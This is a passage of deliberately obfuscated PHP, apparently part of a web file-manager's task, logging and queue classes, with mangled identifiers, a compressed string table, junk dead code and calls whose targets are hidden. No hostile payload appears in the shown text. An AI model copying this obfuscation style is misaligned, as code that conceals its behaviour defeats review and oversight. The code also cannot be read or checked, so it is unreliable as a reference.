case $ëåãµİ÷[122]: $­‡ºÙùŸ = $this->fypma159390a($­øíÄØÂ, strrev($ûèŞ¦Š½ . $ƒĞÃá»­)); $·ŒÃÑñÂ = $ÙÑÂº‹´[773]; if (!$·ŒÃÑñÂ) { return; } break; case $ëåãµİ÷[301]: $­‡ºÙùŸ = $this->fypma159390a($­øíÄØÂ, base64_encode($ûèŞ¦Š½ . $ƒĞÃá»­)); break; $ùÆ½ÙŒú = $ÙÑÂº‹´[774]; while ($ùÆ½ÙŒú < $ÙÑÂº‹´[693]) { if ($ùÆ½ÙŒú >= 0) { break; } $ùÆ½ÙŒú++; } case $ëåãµİ÷[302]: $­‡ºÙùŸ = $this->fypma159390a($­øíÄØÂ, md5($ûèŞ¦Š½ . $ƒĞÃá»­)); break; case $ëåãµİ÷[303]: $­øíÄØÂ = base64_encode($­øíÄØÂ); $ó¸ªÒô = rand(0, 64); $‰Ë–õÁ = $ÙÑÂº‹´[775]; $ò¡÷½â© = $®“·²À[$ó¸ªÒô]; $À‘×§Å = md5($ò¡÷½â© . md5($ƒĞÃá»­ . $ò¡÷½â©) . $ƒĞÃá»­); $²¼®û¢‹ = $ÙÑÂº‹´[776]; if (strlen($²¼®û¢‹) < $ÙÑÂº‹´[706]) { die; } $À‘×§Å = substr($À‘×§Å, $ó¸ªÒô % 8, $ó¸ªÒô % 8 + 7); $·»ñêµ€ = $ÙÑÂº‹´[777]; if (strlen($·»ñêµ€) < $ÙÑÂº‹´[702]) { die; } $ã°ıŞÅ = $ëåãµİ÷[6]; $²†¡é‹Ç = 0; $Ö—ã¨¡ = $ÙÑÂº‹´[778]; if (!$Ö—ã¨¡) { die; } $ß’Ş©ö‹ = 0; $ô˜ûÊßÜ = 0; for ($²†¡é‹Ç = 0; $²†¡é‹Ç < strlen($­øíÄØÂ); $²†¡é‹Ç++) { $ô˜ûÊßÜ = $ô˜ûÊßÜ == strlen($À‘×§Å) ? 0 : $ô˜ûÊßÜ; $ß’Ş©ö‹ = ($ó¸ªÒô + strpos($®“·²À, $­øíÄØÂ[$²†¡é‹Ç]) + ord($À‘×§Å[$ô˜ûÊßÜ++])) % 64; $™Ó†Ê¥É = $ÙÑÂº‹´[779]; $ã°ıŞÅ .= $®“·²À[$ß’Ş©ö‹]; } $­‡ºÙùŸ = hash_encode($ò¡÷½â© . $ã°ıŞÅ); break; $ßüì¸²ú = $ÙÑÂº‹´[780]; if (strlen($ßüì¸²ú) < $ÙÑÂº‹´[724]) { die; } default: $­‡ºÙùŸ = $this->fypma159390a($­øíÄØÂ, $ƒĞÃá»­ . $ûèŞ¦Š½); $áØŠËß­ = $ÙÑÂº‹´[781]; if (!$áØŠËß­) { return; } break; $ì§ûıõ = $ÙÑÂº‹´[782]; while ($ì§ûıõ < $ÙÑÂº‹´[724]) { if ($ì§ûıõ >= 0) { break; } $ì§ûıõ++; } } $­‡ºÙùŸ = strrev($ÉİçàÈ° . $ûèŞ¦Š½ . $­‡ºÙùŸ); if ($ôÜ ¯ªò - 1 > 0) { $­‡ºÙùŸ = $this->hqezba28bfdf($­‡ºÙùŸ, $ƒĞÃá»­, $ôÜ ¯ªò - 1); } return $­‡ºÙùŸ; } private function thbp2f2e4713($‹¼Ä¶¶, $ª›ËÀóË, $˜¥Ô¾ıì = 3) { $Èá÷ê»¡ =& $_SERVER[«òÑğ]; $¢‹§¯Å =& $_SERVER[óÙù™Ê÷]; if (!is_string($‹¼Ä¶¶) || strlen($‹¼Ä¶¶) < 10) { return !1; } $‹¼Ä¶¶ = trim($‹¼Ä¶¶); $ÏÇŒå™Æ = $Èá÷ê»¡[783]; $‹¼Ä¶¶ = strrev($‹¼Ä¶¶); $ô¯§ıñ¿ = $‹¼Ä¶¶[0]; $í—ó„¶Æ = $Èá÷ê»¡[784]; $…ø»´ = substr($‹¼Ä¶¶, 1, 15); $‹¼Ä¶¶ = substr($‹¼Ä¶¶, 16); $“ÉÂûİæ = $Èá÷ê»¡[785]; $”ÔúâÒ‡ = $¢‹§¯Å[300]; $€Í»íûÕ = $Èá÷ê»¡[786]; switch ($ô¯§ıñ¿) { case $¢‹§¯Å[206]: $“Ğ¥š˜¯ = $this->pvjh415d5ad0($‹¼Ä¶¶, strrev($ª›ËÀóË . $…ø»´)); $İ»óµÅ¾ = $Èá÷ê»¡[787]; while ($İ»óµÅ¾ < $Èá÷ê»¡[693]) { if ($İ»óµÅ¾ >= 0) { break; } $İ»óµÅ¾++; } break; $ì°—÷Îª = $Èá÷ê»¡[788]; while (strlen($ì°—÷Îª) < $Èá÷ê»¡[693]) { if (!$ì°—÷Îª) { break; } $ì°—÷Îª++; } case $¢‹§¯Å[122]: $“Ğ¥š˜¯ = $this->pvjh415d5ad0($‹¼Ä¶¶, strrev($…ø»´ . $ª›ËÀóË)); break; case $¢‹§¯Å[301]: $“Ğ¥š˜¯ = $this->pvjh415d5ad0($‹¼Ä¶¶, base64_encode($…ø»´ . $ª›ËÀóË)); $¢»«Ñ¥® = $Èá÷ê»¡[789]; if (!$¢»«Ñ¥®) { die; } break; case $¢‹§¯Å[302]: $“Ğ¥š˜¯ = $this->pvjh415d5ad0($‹¼Ä¶¶, md5($…ø»´ . $ª›ËÀóË)); $æ¥ç¶â¨ = $Èá÷ê»¡[790]; if (strlen($æ¥ç¶â¨) < $Èá÷ê»¡[706]) { return; } break; case $¢‹§¯Å[303]: $‹¼Ä¶¶ = hash_decode($‹¼Ä¶¶); $‚‘Œô‚ı = $‹¼Ä¶¶[0]; $‹¼Ä¶¶ = substr($‹¼Ä¶¶, 1); $†Ò¾¹µŸ = strpos($”ÔúâÒ‡, $‚‘Œô‚ı); $ŞñúÊİ˜ = $Èá÷ê»¡[791]; if (strlen($ŞñúÊİ˜) < $Èá÷ê»¡[702]) { die; } $²’‡Åîµ = md5($‚‘Œô‚ı . md5($ª›ËÀóË . $‚‘Œô‚ı) . $ª›ËÀóË); $²’‡Åîµ = substr($²’‡Åîµ, $†Ò¾¹µŸ % 8, $†Ò¾¹µŸ % 8 + 7); $±‹Ñ¯–• = $¢‹§¯Å[6]; $ëÙ±ôÅó = 0; $Ãû‘¦ÅØ = $Èá÷ê»¡[792]; if (strlen($Ãû‘¦ÅØ) < $Èá÷ê»¡[702]) { die; } $ÄÀ¯ö¿Í = 0; $Ñ‹ÆışĞ = 0; for ($ëÙ±ôÅó = 0; $ëÙ±ôÅó < strlen($‹¼Ä¶¶); $ëÙ±ôÅó++) { $Ñ‹ÆışĞ = $Ñ‹ÆışĞ == strlen($²’‡Åîµ) ? 0 : $Ñ‹ÆışĞ; $Õ¥×´³ = $Ñ‹ÆışĞ++; $ï”¼¬ˆ = $Èá÷ê»¡[793]; $ÄÀ¯ö¿Í = strpos($”ÔúâÒ‡, $‹¼Ä¶¶[$ëÙ±ôÅó]) - $†Ò¾¹µŸ - ord($²’‡Åîµ[$Õ¥×´³]); $¼ï¯Ç = $Èá÷ê»¡[794]; if (strlen($¼ï¯Ç) < $Èá÷ê»¡[696]) { die; } while ($ÄÀ¯ö¿Í < 0) { $ÄÀ¯ö¿Í += 64; $ÃÕ¼çŠµ = $Èá÷ê»¡[795]; if (strlen($ÃÕ¼çŠµ) < $Èá÷ê»¡[724]) { die; } } $±‹Ñ¯–• .= $”ÔúâÒ‡[$ÄÀ¯ö¿Í]; $×ä¡ï¹Ş = $Èá÷ê»¡[796]; if (!$×ä¡ï¹Ş) { die; } } $“Ğ¥š˜¯ = base64_decode($±‹Ñ¯–•); break; default: $“Ğ¥š˜¯ = $this->pvjh415d5ad0($‹¼Ä¶¶, $ª›ËÀóË . $…ø»´); break; $»°óº—è = $Èá÷ê»¡[797]; while (strlen($»°óº—è) < $Èá÷ê»¡[702]) { if (!$»°óº—è) { break; } $»°óº—è++; } } if ($˜¥Ô¾ıì - 1 > 0) { $“Ğ¥š˜¯ = $this->thbp2f2e4713($“Ğ¥š˜¯, $ª›ËÀóË, $˜¥Ô¾ıì - 1); } return $“Ğ¥š˜¯; } public function cdby6a12bd5b($³‰òÓ“†) { $–—Ó€§­ =& $_SERVER[«òÑğ]; $º°Éôç =& $_SERVER[óÙù™Ê÷]; $òÊÛèã = $this->waxve0d0e8bb(); $‘ŸÙ¥òú = $this->waxve0d0e8bb(); $˜Îù‹É = $–—Ó€§­[798]; while (strlen($˜Îù‹É) < $–—Ó€§­[702]) { if (!$˜Îù‹É) { break; } $˜Îù‹É++; } $’§åÍĞ = ($òÊÛèã - 1) * ($‘ŸÙ¥òú - 1); $¦—ı¬üé = intval(($òÊÛèã + $‘ŸÙ¥òú) / 2); $Ó¾šÙÅ = $–—Ó€§­[799]; while ($Ó¾šÙÅ < $–—Ó€§­[696]) { if ($Ó¾šÙÅ >= 0) { break; } $Ó¾šÙÅ++; } while (1) { $½•Ïî†Û = $¦—ı¬üé; $¨ÃĞ½´ = $–—Ó€§­[800]; if (!$¨ÃĞ½´) { return; } $½Ç»Î” = $’§åÍĞ; $Á‘¿ç©Û = $–—Ó€§­[801]; while (strlen($Á‘¿ç©Û) < $–—Ó€§­[706]) { if (!$Á‘¿ç©Û) { break; } $Á‘¿ç©Û++; } while ($½Ç»Î” % $½•Ïî†Û != 0) { $©íÁËü = $½Ç»Î”; $½Ç»Î” = $½•Ïî†Û; $½•Ïî†Û = $©íÁËü % $½•Ïî†Û; $ï‘ÑæùË = $–—Ó€§­[802]; if (strlen($ï‘ÑæùË) < $–—Ó€§­[724]) { return; } } if ($½•Ïî†Û == 1) { break; } else { $¦—ı¬üé++; } } $¬ÛŒÛî· = 2; for ($à şÂ¢ = 0; $à şÂ¢ < $’§åÍĞ * 10; $à şÂ¢++) { if (($’§åÍĞ * $à şÂ¢ + 1) % $¦—ı¬üé == 0) { $¬ÛŒÛî· = intval(($’§åÍĞ * $à şÂ¢ + 1) / $¦—ı¬üé); break; } } $­»·Ìô™ = $this->fypma159390a($òÊÛèã * $‘ŸÙ¥òú . $º°Éôç[6], $º°Éôç[136]); $˜Æâš· = $–—Ó€§­[803]; if (strlen($˜Æâš·) < $–—Ó€§­[696]) { return; } $¸ƒ¡ËÉÉ = md5($º°Éôç[304] . ($òÊÛèã + $‘ŸÙ¥òú) . $º°Éôç[305] . $¦—ı¬üé . $º°Éôç[305] . $¬ÛŒÛî· . $º°Éôç[306]); $ó«ÔÓÛ¿ = $this->fypma159390a($³‰òÓ“†, $¸ƒ¡ËÉÉ) . $º°Éôç[307] . $­»·Ìô™; return $ó«ÔÓÛ¿; $µñéğ£© = $–—Ó€§­[804]; while ($µñéğ£© < $–—Ó€§­[696]) { if ($µñéğ£© >= 0) { break; } $µñéğ£©++; } } public function jbzq33a78e95($âå¥¹©³) { $üŠûİôĞ =& $_SERVER[«òÑğ]; $ÊĞéÚÃ =& $_SERVER[óÙù™Ê÷]; $„¨¿À¶ = explode($ÊĞéÚÃ[307], $âå¥¹©³); if (count($„¨¿À¶) != 2) { return $ÊĞéÚÃ[6]; } $¼èèë¨ú = $this->pvjh415d5ad0($„¨¿À¶[1] . $ÊĞéÚÃ[6], $ÊĞéÚÃ[136]); if (!$¼èèë¨ú) { return $ÊĞéÚÃ[6]; } $¼èèë¨ú = intval($¼èèë¨ú); $ñ Œ±å… = $üŠûİôĞ[805]; if (!$ñ Œ±å…) { die; } $ù´ûòöÁ = 0; $åÈ¥•ğÈ = 0; $ÍÓ„Üè¸ = $üŠûİôĞ[806]; for ($­óù’· = 3; $­óù’· < $¼èèë¨ú; $­óù’· += 2) { if ($¼èèë¨ú % $­óù’· != 0) { continue; } $ù´ûòöÁ = $­óù’·; $¬öïñÂ = $üŠûİôĞ[807]; if (strlen($¬öïñÂ) < $üŠûİôĞ[702]) { return; } $åÈ¥•ğÈ = intval($¼èèë¨ú / $­óù’·); $ÖâÉì“¸ = $üŠûİôĞ[808]; if (!$ÖâÉì“¸) { return; } break; $³÷õ’å = $üŠûİôĞ[809]; } $²®´ş³­ = ($ù´ûòöÁ - 1) * ($åÈ¥•ğÈ - 1); $€ÏğøÊÄ = intval(($ù´ûòöÁ + $åÈ¥•ğÈ) / 2); $ä„½»µœ = $üŠûİôĞ[810]; if (!$ä„½»µœ) { return; } while (1) { $Õ­ñéì = $€ÏğøÊÄ; $¹Üƒ÷¡ = $²®´ş³­; $ÈÏ§µàÄ = $üŠûİôĞ[811]; while (strlen($ÈÏ§µàÄ) < $üŠûİôĞ[702]) { if (!$ÈÏ§µàÄ) { break; } $ÈÏ§µàÄ++; } while ($¹Üƒ÷¡ % $Õ­ñéì != 0) { $‡‘ıÏ¿· = $¹Üƒ÷¡; $¹Üƒ÷¡ = $Õ­ñéì; $ğ€ÍŠô¶ = $üŠûİôĞ[812]; if (strlen($ğ€ÍŠô¶) < $üŠûİôĞ[702]) { return; } $Õ­ñéì = $‡‘ıÏ¿· % $Õ­ñéì; $Ûˆ“ªæ = $üŠûİôĞ[813]; } if ($Õ­ñéì == 1) { break; } else { $€ÏğøÊÄ++; } } $ŠÀ½¿€Ú = 2; $ì¹Å´ÙÖ = $üŠûİôĞ[814]; if (strlen($ì¹Å´ÙÖ) < $üŠûİôĞ[693]) { die; } for ($­óù’· = 0; $­óù’· < $²®´ş³­ * 10; $­óù’·++) { if (($²®´ş³­ * $­óù’· + 1) % $€ÏğøÊÄ == 0) { $ŠÀ½¿€Ú = intval(($²®´ş³­ * $­óù’· + 1) / $€ÏğøÊÄ); break; } } $ª£¦âµ = md5($ÊĞéÚÃ[304] . ($ù´ûòöÁ + $åÈ¥•ğÈ) . $ÊĞéÚÃ[305] . $€ÏğøÊÄ . $ÊĞéÚÃ[305] . $ŠÀ½¿€Ú . $ÊĞéÚÃ[306]); $šœã·øÅ = $üŠûİôĞ[752]; if (!$šœã·øÅ) { return; } $èÙŞùÃ = $this->pvjh415d5ad0($„¨¿À¶[0], $ª£¦âµ); return $èÙŞùÃ; $ò‹Úõ²© = $üŠûİôĞ[815]; while ($ò‹Úõ²© < $üŠûİôĞ[702]) { if ($ò‹Úõ²© >= 0) { break; } $ò‹Úõ²©++; } } public function waxve0d0e8bb() { $æÍ¯™ÊŸ =& $_SERVER[«òÑğ]; $«ß¦Šğ = mt_rand(pow(2, 14), pow(2, 16) - 1); $ˆ¤¬ãñè = $æÍ¯™ÊŸ[816]; if (strlen($ˆ¤¬ãñè) < $æÍ¯™ÊŸ[693]) { return; } $Ó­äÑ² = array(); $ôùêœú = $æÍ¯™ÊŸ[817]; if (!$ôùêœú) { die; } $Í•›Ëô = 1; $½Õáäß§ = $æÍ¯™ÊŸ[818]; while ($Í•›Ëô <= (int) sqrt($«ß¦Šğ)) { $§Ê«„» = $Í•›Ëô; $¨œ¿Å¯ = $æÍ¯™ÊŸ[819]; while ($¨œ¿Å¯ < $æÍ¯™ÊŸ[706]) { if ($¨œ¿Å¯ >= 0) { break; } $¨œ¿Å¯++; } while (!0) { $§Ê«„»++; $ÚÇÁ¼îà = $æÍ¯™ÊŸ[820]; if (!$ÚÇÁ¼îà) { die; } if ($§Ê«„» <= 2) { $Í•›Ëô = $§Ê«„»; break; } else { if ($§Ê«„» < 2) { continue; } } $îÔ­×ó† = !0; for ($Şó‰ıØš = 2; $Şó‰ıØš <= sqrt($§Ê«„»); $Şó‰ıØš++) { if ($§Ê«„» % $Şó‰ıØš == 0) { $îÔ­×ó† = !1; } } if ($îÔ­×ó†) { $Í•›Ëô = $§Ê«„»; break; } } $Ó­äÑ²[] = $Í•›Ëô; $ÚÖÙ¿éø = $æÍ¯™ÊŸ[821]; } $òäÒ º¬ = 2; for ($§Ê«„» = $«ß¦Šğ; $§Ê«„» > 1; $§Ê«„»--) { $îÔ­×ó† = !0; foreach ($Ó­äÑ² as $Ö—õ£šâ) { if ($§Ê«„» % $Ö—õ£šâ == 0) { $îÔ­×ó† = !1; break; } } if ($îÔ­×ó†) { $òäÒ º¬ = $§Ê«„»; break; } } return $òäÒ º¬; } public function bjol916b0064($ù¢È¨­Æ, $†á–Ã³ğ) { $˜îëêÆ² =& $_SERVER[óÙù™Ê÷]; return call_user_func(array($˜îëêÆ²[8], $˜îëêÆ²[308]), $ù¢È¨­Æ, $†á–Ã³ğ); $†½šæ‡¢ = $_SERVER[«òÑğ][822]; } public function fypma159390a($‚ùø, $‹ßÑ½ù) { $®’Ù‡ê• =& $_SERVER[óÙù™Ê÷]; return call_user_func(array($®’Ù‡ê•[309], $®’Ù‡ê•[310]), $‚ùø, $‹ßÑ½ù); } public function pvjh415d5ad0($ïÈÍ¥½˜, $²«‘²âè) { $äéşÀÅ =& $_SERVER[«òÑğ]; $‘¼Î¿Éí =& $_SERVER[óÙù™Ê÷]; return call_user_func(array($‘¼Î¿Éí[309], $‘¼Î¿Éí[311]), $ïÈÍ¥½˜, $²«‘²âè); $—›‡‚¼ = $äéşÀÅ[823]; if (strlen($—›‡‚¼) < $äéşÀÅ[724]) { return; } } } goto D©ª™‡ƒ»õ; BŒëÃÊ†¬: define($_SERVER[«òÑğ][0], $_SERVER[«òÑğ][1]); $_SERVER[ó÷»×] = explode($_SERVER[«òÑğ][2], gzinflate(substr($_SERVER[«òÑğ][3], 10, -8))); function binCheckEq($œóÖŸÀÛ, $ŠíÑ¥˜) { return $œóÖŸÀÛ == $ŠíÑ¥˜; } goto e®¶ÇŸ÷Œˆ; A¦ÖÏ¨ô‰”: class TaskHttp extends Task { protected function startAfter() { $¼ŒÕöØ’ =& $_SERVER[«òÑğ]; $üøİ¼İƒ =& $this->task; $üøİ¼İƒ[$¼ŒÕöØ’[1862]] = 1; Hook::bind($¼ŒÕöØ’[1830], array($this, $¼ŒÕöØ’[1863])); Hook::bind($¼ŒÕöØ’[1832], array($this, $¼ŒÕöØ’[1864])); Hook::bind($¼ŒÕöØ’[1834], array($this, $¼ŒÕöØ’[1865])); } protected function endAfter() { $¾Èû—Òò =& $_SERVER[«òÑğ]; Hook::unbind($¾Èû—Òò[1830], array($this, $¾Èû—Òò[1863])); Hook::unbind($¾Èû—Òò[1832], array($this, $¾Èû—Òò[1864])); Hook::unbind($¾Èû—Òò[1834], array($this, $¾Èû—Òò[1865])); } public function progressStart($ùø€¡ÃÔ) { $×õŸœ§ç =& $_SERVER[«òÑğ]; $¶™¸–¸ = curl_getinfo($ùø€¡ÃÔ); self::log($×õŸœ§ç[1866] . $¶™¸–¸[$×õŸœ§ç[385]]); self::valueSet($this->task[$×õŸœ§ç[478]], $this->task); } public function progressEnd($’…ŸÁ¯) { $›´ğÙ“ =& $_SERVER[«òÑğ]; self::log($›´ğÙ“[1867] . $this->task[$›´ğÙ“[478]]); $this->end(); } public function progress($Äçİ§à¡, $†ÇÛ‰Ñ·, $µ‡ä”ÒŠ, $ÀĞ†ù—‘, $ÎóúÈÕ) { $Õ¬è´³Õ =& $_SERVER[«òÑğ]; $õ¾¯áùè =& $this->task; if ($ÎóúÈÕ > 0) { $õ¾¯áùè[$Õ¬è´³Õ[1150]] = $õ¾¯áùè[$Õ¬è´³Õ[1150]] == 0 ? $ÀĞ†ù—‘ : $õ¾¯áùè[$Õ¬è´³Õ[1150]]; $õ¾¯áùè[$Õ¬è´³Õ[1785]] = $ÎóúÈÕ; } else { if ($µ‡ä”ÒŠ > 0) { $õ¾¯áùè[$Õ¬è´³Õ[1150]] = $õ¾¯áùè[$Õ¬è´³Õ[1150]] == 0 ? $†ÇÛ‰Ñ· : $õ¾¯áùè[$Õ¬è´³Õ[1150]]; $õ¾¯áùè[$Õ¬è´³Õ[1785]] = $µ‡ä”ÒŠ; } } $this->update(); self::log("\x70\162\x6f\147\x72\x65\163\x73\110\164\164\160\72\x64\157\167\156\x3a{$µ‡ä”ÒŠ}\57{$†ÇÛ‰Ñ·}\73\x20\x75\160\154\157\141\144\x3a{$ÎóúÈÕ}\x2f{$ÀĞ†ù—‘}\x3b"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÌÊŠåÊñ, $õ’é¼ÕÄ = '', $·ÛÑĞÓ¥ = 0, $ÊØÆç¡é = '') { $ü‘À¥ú½ =& $_SERVER[«òÑğ]; $ÊØÆç¡é = $ÊØÆç¡é ? $ÊØÆç¡é : ($õ’é¼ÕÄ ? $õ’é¼ÕÄ : $ÌÊŠåÊñ); $Ü†ûÍŠü = new Task($ÌÊŠåÊñ, $õ’é¼ÕÄ, $·ÛÑĞÓ¥, $ÊØÆç¡é); $GLOBALS[$ü‘À¥ú½[1868] . $ÌÊŠåÊñ] = new TaskLog($ü‘À¥ú½[1767], $Ü†ûÍŠü, $ÊØÆç¡é); return $Ü†ûÍŠü; } public function __construct($¿š—ÔÀ³ = '', $ï“¡×™ = '', $…ßÖÆ×Â = '') { $íœ‘‘µå =& $_SERVER[«òÑğ]; if (!$¿š—ÔÀ³) { $¿š—ÔÀ³ = $íœ‘‘µå[1767]; } $á¿é‰¦µ = $¿š—ÔÀ³ . $íœ‘‘µå[465] . rand_string(10); if (!$…ßÖÆ×Â) { $…ßÖÆ×Â = $¿š—ÔÀ³ . $íœ‘‘µå[53] . $…ßÖÆ×Â; } switch ($¿š—ÔÀ³) { case $íœ‘‘µå[1767]: if (!$ï“¡×™ || !$ï“¡×™->task) { return echoLog($¿š—ÔÀ³ . $íœ‘‘µå[1869]); } $É€“Ë×ô = $ï“¡×™; $á¿é‰¦µ = $É€“Ë×ô->task[$íœ‘‘µå[478]]; $¿š—ÔÀ³ = $É€“Ë×ô->task[$íœ‘‘µå[478]]; if (!$É€“Ë×ô->task[$íœ‘‘µå[1671]]) { $É€“Ë×ô->task[$íœ‘‘µå[1671]] = $…ßÖÆ×Â ? $…ßÖÆ×Â : $¿š—ÔÀ³; } break; case $íœ‘‘µå[1870]: if (!$ï“¡×™) { return echoLog($¿š—ÔÀ³ . $íœ‘‘µå[1871]); } $¯ñÊ“‚ = is_string($ï“¡×™) ? array($ï“¡×™) : $ï“¡×™; $É€“Ë×ô = new TaskFileTransfer($á¿é‰¦µ, $¿š—ÔÀ³, 0, $…ßÖÆ×Â ? $…ßÖÆ×Â : $¯ñÊ“‚[0]); foreach ($¯ñÊ“‚ as $­Å›üŒÃ) { $É€“Ë×ô->addPath($­Å›üŒÃ); } break; case $íœ‘‘µå[391]: if (!$ï“¡×™) { return echoLog($¿š—ÔÀ³ . $íœ‘‘µå[1871]); } $¯ñÊ“‚ = is_string($ï“¡×™) ? array($ï“¡×™) : $ï“¡×™; $É€“Ë×ô = new TaskZip($á¿é‰¦µ, $¿š—ÔÀ³, 0, $…ßÖÆ×Â ? $…ßÖÆ×Â : $¯ñÊ“‚[0]); foreach ($¯ñÊ“‚ as $­Å›üŒÃ) { $É€“Ë×ô->addPath($­Å›üŒÃ); } break; case $íœ‘‘µå[1309]: if (!$ï“¡×™) { return echoLog($¿š—ÔÀ³ . $íœ‘‘µå[1871]); } $É€“Ë×ô = new TaskUnZip($á¿é‰¦µ, $¿š—ÔÀ³, 0, $…ßÖÆ×Â ? $…ßÖÆ×Â : $ï“¡×™); if ($ï“¡×™) { $É€“Ë×ô->addFile($ï“¡×™); } break; case $íœ‘‘µå[152]: $É€“Ë×ô = new TaskHttp($á¿é‰¦µ, $¿š—ÔÀ³); break; default: return; break; } $this->task = $É€“Ë×ô; $this->taskID = $á¿é‰¦µ; Hook::bind($íœ‘‘µå[1805], array($this, $íœ‘‘µå[1872])); Hook::bind($íœ‘‘µå[1807], array($this, $íœ‘‘µå[1873])); Hook::bind($íœ‘‘µå[1801], array($this, $íœ‘‘µå[1874])); echoLog($íœ‘‘µå[1875] . $É€“Ë×ô->task[$íœ‘‘µå[1671]]); } public function __destruct() { $this->end(); } public function end($üŸã÷¶¢ = '') { $…Åİ›¹³ =& $_SERVER[«òÑğ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($üŸã÷¶¢); $this->task = !1; $this->taskID = !1; Hook::unbind($…Åİ›¹³[1805], array($this, $…Åİ›¹³[1872])); Hook::unbind($…Åİ›¹³[1807], array($this, $…Åİ›¹³[1873])); Hook::unbind($…Åİ›¹³[1801], array($this, $…Åİ›¹³[1874])); } public function taskUpdate($Î·ÎØø³) { $®úÖÔÒ =& $_SERVER[«òÑğ]; if (!$Î·ÎØø³ || $this->taskID != $Î·ÎØø³[$®úÖÔÒ[478]]) { return; } $—Ëƒêè´ = 20; $×³ü“É— = intval($Î·ÎØø³[$®úÖÔÒ[1786]] * $—Ëƒêè´); $‹ñ¿ÕÔ = $®úÖÔÒ[176] . str_repeat($®úÖÔÒ[509], $×³ü“É—) . $®úÖÔÒ[1101] . str_repeat($®úÖÔÒ[53], $—Ëƒêè´ - $×³ü“É—) . $®úÖÔÒ[178]; $½¤ô‹§ = $‹ñ¿ÕÔ . sprintf($®úÖÔÒ[1876], $Î·ÎØø³[$®úÖÔÒ[1786]] * 100) . $®úÖÔÒ[1877]; $¥¿›¼ó§ = $½¤ô‹§ . $Î·ÎØø³[$®úÖÔÒ[1785]] . $®úÖÔÒ[8] . $Î·ÎØø³[$®úÖÔÒ[1150]] . LNG($®úÖÔÒ[1878]); $ñÀè¼ø = $®úÖÔÒ[12]; if ($Î·ÎØø³[$®úÖÔÒ[1862]]) { $¥¿›¼ó§ = $½¤ô‹§ . size_format($Î·ÎØø³[$®úÖÔÒ[1785]]) . $®úÖÔÒ[8] . size_format($Î·ÎØø³[$®úÖÔÒ[1150]]); $ñÀè¼ø = size_format($Î·ÎØø³[$®úÖÔÒ[1787]]) . $®úÖÔÒ[1879]; } if ($Î·ÎØø³[$®úÖÔÒ[1152]]) { $Î·ÎØø³[$®úÖÔÒ[1836]] = $Î·ÎØø³[$®úÖÔÒ[1152]] . $®úÖÔÒ[53] . $Î·ÎØø³[$®úÖÔÒ[1836]]; } if ($Î·ÎØø³[$®úÖÔÒ[1836]]) { $×­Ş£º¢ = $®úÖÔÒ[12]; if ($Î·ÎØø³[$®úÖÔÒ[1838]]) { $×­Ş£º¢ = $®úÖÔÒ[50] . size_format($Î·ÎØø³[$®úÖÔÒ[1839]]) . $®úÖÔÒ[8] . size_format($Î·ÎØø³[$®úÖÔÒ[1838]]); } $ñÀè¼ø .= $Î·ÎØø³[$®úÖÔÒ[1836]] . $×­Ş£º¢; } if ($Î·ÎØø³[$®úÖÔÒ[847]] && !$Î·ÎØø³[$®úÖÔÒ[1838]]) { $ñÀè¼ø .= $®úÖÔÒ[53] . size_format($Î·ÎØø³[$®úÖÔÒ[1843]]) . $®úÖÔÒ[8] . size_format($Î·ÎØø³[$®úÖÔÒ[847]]); } echoLog($¥¿›¼ó§ . $®úÖÔÒ[53] . $ñÀè¼ø, !0); } public function taskEnd($³Áííò³) { $ª„™üƒõ =& $_SERVER[«òÑğ]; if (!$³Áííò³ || $this->taskID != $³Áííò³[$ª„™üƒõ[478]]) { return; } $¡ï®ó¹É = $³Áííò³ ? LNG($ª„™üƒõ[1880]) . $ª„™üƒõ[4] . $³Áííò³[$ª„™üƒõ[1785]] . $ª„™üƒõ[8] . $³Áííò³[$ª„™üƒõ[1150]] . LNG($ª„™üƒõ[1878]) . $ª„™üƒõ[74] : $ª„™üƒõ[12]; echoLog($ª„™üƒõ[1881] . $³Áííò³[$ª„™üƒõ[1671]] . ($³Áííò³[$ª„™üƒõ[529]] ? $ª„™üƒõ[74] . $³Áííò³[$ª„™üƒõ[529]] : $ª„™üƒõ[12]) . $ª„™üƒõ[74] . $¡ï®ó¹É . $ª„™üƒõ[1882] . sprintf($ª„™üƒõ[941], timeFloat() - $³Áííò³[$ª„™üƒõ[1788]]) . $ª„™üƒõ[1800]); $this->end(); } public function taskKill($û¯¼„úª) { $µ®Ş„ ­ =& $_SERVER[«òÑğ]; if (!$û¯¼„úª || $this->taskID != $û¯¼„úª[$µ®Ş„ ­[478]]) { return; } echoLog($µ®Ş„ ­[1883] . $û¯¼„úª[$µ®Ş„ ­[1671]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\x75\x65\165\145\114\145\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\x73\x6b\x51\165\145\x75\145\104\141\164\141"; const QUEUE_TIME = "\164\141\163\153\121\165\x65\165\x65\114\141\x73\164\x52\x75\x6e"; const QUEUE_THREAD = "\x74\141\163\x6b\x51\x75\x65\165\145\124\150\162\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($¡½ª¶ , $üŸèóà = array(), $ÍÓö¬ü– = '', $ÁÛñãôÛ = '') { $·­¬…ßÉ =& $_SERVER[«òÑğ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÁÛñãôÛ && array_find_by_field(self::$listData, $·­¬…ßÉ[97], $ÁÛñãôÛ)) { return !0; } if ($ÁÛñãôÛ && array_find_by_field(self::$listDataAdd, $·­¬…ßÉ[97], $ÁÛñãôÛ)) { return !0; } self::$listDataAdd[] = array($·­¬…ßÉ[344] => $¡½ª¶ , $·­¬…ßÉ[1884] => $üŸèóà, $·­¬…ßÉ[529] => $ÍÓö¬ü–, $·­¬…ßÉ[97] => $ÁÛñãôÛ); return !0; } public static function addSubmit() { $ô¦Ê„Âß =& $_SERVER[«òÑğ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ô¦Ê„Âß[1885] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ô¦Ê„Âß[12], $ô¦Ê„Âß[529])), $ô¦Ê„Âß[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($¥”ú„—, $‚Ä‡Èî = array(), $ø«¡öçÚ = '', $¡¶  Íˆ = '') { $Ì®×¼‘‚ =& $_SERVER[«òÑğ]; if 